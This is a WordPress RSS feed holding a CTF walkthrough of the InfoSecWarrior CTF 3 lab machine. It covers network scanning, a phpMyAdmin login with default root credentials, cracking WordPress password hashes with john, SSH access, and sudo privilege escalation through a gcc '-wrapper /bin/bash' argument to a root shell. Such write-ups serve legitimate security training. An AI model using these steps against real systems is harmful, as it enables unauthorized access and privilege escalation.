@@ -1,0 +1,276 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>ctf Archives - Armour Infosec</title>
+	<atom:link href="https://www.armourinfosec.com/tag/ctf/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.armourinfosec.com/tag/ctf/</link>
+	<description>Do Your Part - Be Security Smart</description>
+	<lastBuildDate>Fri, 10 Apr 2020 03:56:08 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.3.1</generator>
+
+<image>
+	<url>https://www.armourinfosec.com/wp-content/uploads/2018/02/ai.png</url>
+	<title>ctf Archives - Armour Infosec</title>
+	<link>https://www.armourinfosec.com/tag/ctf/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>InfoSecWarrior CTF: 3 Walkthrough</title>
+		<link>https://www.armourinfosec.com/infosecwarrior-ctf-3-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/infosecwarrior-ctf-3-walkthrough/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Thu, 09 Apr 2020 18:25:45 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[armour infosec]]></category>
+		<category><![CDATA[ctf]]></category>
+		<category><![CDATA[infosec warrior]]></category>
+		<category><![CDATA[infosec warrior 3]]></category>
+		<category><![CDATA[vulnhub]]></category>
+		<category><![CDATA[walkthrough]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=26013</guid>
+
+					<description><![CDATA[<p>Here is the new challenge of InfoSecWarrior CTF: 3 Walkthrough by Infosec Warrior CTF 2020. The box is designed by...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/infosecwarrior-ctf-3-walkthrough/">InfoSecWarrior CTF: 3 Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Here is the new challenge of <a href="https://www.infosecwarrior.com/infosecwarrior-ctf-2020-3/"><strong>InfoSecWarrior CTF: 3 Walkthrough</strong></a> by <a href="https://www.infosecwarrior.com/">Infosec Warrior CTF 2020</a>. The box is designed by Vishal Biswas aka CyberKnight. The goal is to gain the highest privileges and collect only 2 flags (user flag and root flag). According to author box consist  WordPress developer configured the machine to work internally. But due to some miss-configuration WordPress is exposed to the outside world. Use your skills and get the root flag. So let us go.</p>
+<p>&nbsp;</p>
+<p><img decoding="async" fetchpriority="high" class="alignnone wp-image-26026 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-10-09-07-53.png" alt="" width="800" height="522" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-10-09-07-53.png 800w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-10-09-07-53-300x196.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-10-09-07-53-768x501.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></p>
+<h3>Pentester Methodology</h3>
+<h5>Network Scanning</h5>
+<ul>
+<li>Netdiscover</li>
+<li>Nmap</li>
+</ul>
+<h5>Enumeration</h5>
+<ul>
+<li>Nikto</li>
+<li>phpMyAdmin</li>
+<li>John</li>
+<li>SSH</li>
+</ul>
+<h5>Privilege Escalation</h5>
+<ul>
+<li>Sudo -l</li>
+<li>gcc compilation</li>
+</ul>
+<h3>Network Scanning</h3>
+<p>We start with <strong>Netdiscover </strong> to obtain IP address as followed</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#netdiscover -i vboxnet0
+	 Currently scanning: 192.168.12.0/16   |   Screen View: Unique Hosts                                                                                                                            
+                                                                                                                                                                                                
+ 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102                                                                                                                                
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.2.2     08:00:27:a0:51:d5      1      42  PCS Systemtechnik GmbH                                                                                                                       
+ 192.168.2.17    08:00:27:a7:26:e1      1      60  PCS Systemtechnik GmbH
+</pre>
+<p>Got the machine Ip <strong>192.168.2.17 </strong>and let us scan the <strong>Nmap.</strong></p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nmap -p- -A -O 192.168.2.17
+Starting Nmap 7.80 ( https://nmap.org/ ) at 2020-04-09 18:53 IST
+Nmap scan report for 192.168.2.17
+Host is up (0.00048s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d8:ad:48:16:27:f8:cc:99:3a:2f:db:c1:a9:d5:3a:d1 (RSA)
+|   256 51:06:ab:78:61:f5:4c:03:a0:8f:01:27:f9:17:51:e7 (ECDSA)
+|_  256 d5:63:58:ba:2a:d5:d2:17:cb:63:12:34:d6:cd:b6:b9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 5.3.2
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: TEST WORDPRESS – Just another WordPress site
+MAC Address: 08:00:27:A7:26:E1 (Oracle VirtualBox virtual NIC)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=4/9%OT=22%CT=1%CU=44313%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
+OS:=5E8F21EA%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%
+OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
+OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
+OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
+OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
+OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
+OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
+OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
+OS:%T=40%CD=S)</pre>
+<h3>Enumeration</h3>
+<p>On visiting the web page there, we see a WordPress web site. But the WordPress website doesn’t work properly error here so we moved on our next step.</p>
+<p><img decoding="async" class="alignnone wp-image-26015 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-082625.jpg" alt="" width="537" height="677" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-082625.jpg 537w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-082625-238x300.jpg 238w" sizes="(max-width: 537px) 100vw, 537px" /></p>
+<p>So I fired <strong>Nikto </strong>and found <strong>phpMyAdmin page.</strong></p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nikto -h http://192.168.2.17/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.17
++ Target Hostname:    192.168.2.17
++ Target Port:        80
++ Start Time:         2020-04-09 18:55:13 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with contents: &lt;http://127.0.0.1/index.php/wp-json/&gt;; rel="https://api.w.org/"
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site differently to the MIME type
++ Uncommon header 'x-redirect-by' found, with contents: WordPress
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ Uncommon header 'x-ob_mode' found, with contents: 1
++ Cookie goto created without the httponly flag
++ Cookie back created without the httponly flag
++ OSVDB-3092: /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /: A WordPress installation was found.
++ /phpmyadmin/: phpMyAdmin directory found
++ Cookie wordpress_test_cookie created without the httponly flag
++ /wp-login.php: WordPress login found
++ OSVDB-3092: /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ 7916 requests: 0 error(s) and 20 item(s) reported on remote host
++ End Time:           2020-04-09 18:56:16 (GMT5.5) (63 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+<p>so I logged in with credentials <strong>root: root. </strong>it was a success</p>
+<p><img decoding="async" class="alignnone wp-image-26016 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083215.jpg" alt="InfoSecWarrior CTF: 3 Walkthrough" width="841" height="494" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083215.jpg 841w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083215-300x176.jpg 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083215-768x451.jpg 768w" sizes="(max-width: 841px) 100vw, 841px" /></p>
+<p>We successfully login with the root MySQL database then I select the wpdb database on open the wp-user table and we see two user entries Krishna and user1 as shown in the image file.</p>
+<p><img decoding="async" class="alignnone wp-image-26017 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083316-1024x460.jpg" alt="InfoSecWarrior CTF: 3 Walkthrough" width="1024" height="460" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083316-1024x460.jpg 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083316-300x135.jpg 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083316-768x345.jpg 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083316.jpg 1160w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>I copy the users hash and save a text file and crack the hash using the john tool use the following command</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:04 0.13% (ETA: 20:05:08) 0g/s 5444p/s 5444c/s 5444C/s sharpie1..alvina
+0g 0:00:00:45 1.36% (ETA: 20:08:02) 0g/s 5109p/s 5109c/s 5109C/s 12062525..109109109
+infosec					(?)
+Session aborted
+
+john --wordlist=/usr/share/wordlists/rockyou.txt user
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:04 0.13% (ETA: 20:05:08) 0g/s 5444p/s 5444c/s 5444C/s sharpie1..alvina
+0g 0:00:00:45 23.36% (ETA: 20:08:02) 0g/s 5109p/s 5109c/s 5109C/s 12062525..109109109
+user1					(?)
+Session aborted</pre>
+<p>And we see WordPress hashes is cracked successfully and I try to login ssh using the WordPress credentials and us successful login with ssh Krishna shell. Krishna: infosec</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#ssh krishna@192.168.2.17
+The authenticity of host '192.168.2.17 (192.168.2.17)' can't be established.
+ECDSA key fingerprint is SHA256:L8AFuzt5MRe4jDRpDukvoY4rrvpBMl49RbM0tbVdeVM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.17' (ECDSA) to the list of known hosts.
+krishna@192.168.2.17's password: 
+krishna@ck05:~$ id 
+uid=1001(krishna) gid=1001(krishna) groups=1001(krishna)
+krishna@ck05:~$ hostname
+ck05
+krishna@ck05:~$ whoami 
+krishna</pre>
+<p>Got the Shell</p>
+<h3>Privilege Escalation</h3>
+<p>I ran the<strong> sudo -l</strong> command and I found <strong>Krishna</strong> has <strong>sudo</strong> permission to run a bash script as <strong>loopspell</strong> this script is compiler a <strong>#C</strong> language file using <strong>gcc</strong> using this command we privilege escalate this machine.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">krishna@ck05:~$ sudo -l
+Matching Defaults entries for krishna on ck05:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User krishna may run the following commands on ck05:
+    (loopspell : ALL) NOPASSWD: /home/loopspell/code_compiler.sh
+krishna@ck05:~$ sudo -u loopspell /home/loopspell/code_compiler.sh "-wrapper /bin/bash,-s ."
+Code is being compiling ...
+loopspell@ck05:~$ id 
+uid=1002(loopspell) gid=1002(loopspell) groups=1002(loopspell)
+loopspell@ck05:~$ hostname
+ck05
+loopspell@ck05:~$ whoami 
+loopspell</pre>
+<p>The sudo -l command and we see sudoers filer entry <strong>/usr/bin/gcc</strong> and <strong>code_compiler.sh</strong>. using sudo I again run the privilege escalation command and we have a root shell target machine</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">loopspell@ck05:/home$ cd loopspell/
+loopspell@ck05:/home/loopspell$ ls 
+backup.c  backup.txt  code_compiler.sh	user.txt
+loopspell@ck05:/home/loopspell$ cat user.txt 
+a4e3fea7510e570f6964899eb764abdc
+loopspell@ck05:/home/loopspell$ sudo -l
+Matching Defaults entries for loopspell on ck05:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User loopspell may run the following commands on ck05:
+    (ALL : ALL) /usr/bin/gcc
+    (ALL : ALL) NOPASSWD: /home/loopspell/code_compiler.sh
+loopspell@ck05:/home/loopspell$ sudo -l
+Matching Defaults entries for loopspell on ck05:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User loopspell may run the following commands on ck05:
+    (ALL : ALL) /usr/bin/gcc
+    (ALL : ALL) NOPASSWD: /home/loopspell/code_compiler.sh
+loopspell@ck05:/home/loopspell$ sudo /home/loopspell/code_compiler.sh 
+Code is being compiling ...
+gcc: fatal error: no input files
+compilation terminated.
+You can find your compiled code in /tmp/ directory.
+loopspell@ck05:/home/loopspell$ sudo /home/loopspell/code_compiler.sh "-wrapper /bin/bash,-s ."
+Code is being compiling ...
+root@ck05:/home/loopspell# id 
+uid=0(root) gid=0(root) groups=0(root)
+root@ck05:/home/loopspell# hostname
+ck05
+root@ck05:/home/loopspell# whoami
+root
+root@ck05:/home/loopspell# passwd
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+root@ck05:/home/loopspell# cd 
+root@ck05:~# ls
+msg.txt
+root@ck05:~# cd /root/
+root@ck05:/root# ls
+root.txt
+root@ck05:/root# cat root
+cat: root: No such file or directory
+root@ck05:/root# cat root.txt 
+_________        ___.                 ____  __.      .__       .__     __    _______   .________
+\_   ___ \___.__.\_ |__   ___________|    |/ _| ____ |__| ____ |  |___/  |_  \   _  \  |   ____/
+/    \  \&lt;   |  | | __ \_/ __ \_  __ \      &lt;  /    \|  |/ ___\|  |  \   __\ /  /_\  \ |____  \ 
+\     \___\___  | | \_\ \  ___/|  | \/    |  \|   |  \  / /_/  &gt;   Y  \  |   \  \_/   \/       \
+ \______  / ____| |___  /\___  &gt;__|  |____|__ \___|  /__\___  /|___|  /__|    \_____  /______  /
+        \/\/          \/     \/              \/    \/  /_____/      \/              \/       \/ 
+
+
+flag = efa4c284b8e2a15674dfb369384c8bcf
+
+This flag is a proof that you get the root shell.
+
+Tag me on Twitter with @CyberKnight00 
+root@ck05:/root# 
+</pre>
+<p>Eureka !!!! got root.</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/infosecwarrior-ctf-3-walkthrough/">InfoSecWarrior CTF: 3 Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/infosecwarrior-ctf-3-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
